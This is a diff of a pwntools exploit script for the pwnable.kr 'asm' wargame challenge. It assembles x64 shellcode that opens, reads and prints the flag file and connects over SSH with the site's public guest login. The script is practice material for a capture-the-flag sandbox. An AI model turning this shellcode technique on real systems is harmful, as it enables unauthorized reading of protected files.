@@ -3,7 +3,6 @@ context(arch='amd64', os='linux')
 context.log_level='debug'
 
 # This stub code just clears all the registers
-# print(disasm("\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff", arch = 'amd64'))
 
 filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
 
@@ -45,9 +44,11 @@ shellcode += shellcraft.write(1, 'rsp', 48) # fd, buf, numBytes
 # time.sleep(10000)
 
 raw_shellcode = asm(shellcode, arch = 'amd64', os = 'linux')
+con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
+p = con.connect_remote('localhost', 9026)
 
 print(repr(raw_shellcode))
 print p.recvuntil("give me your x64 shellcode: ")
-p.sendline(shellcode)
+p.sendline(raw_shellcode)
 print p.recvline()
 
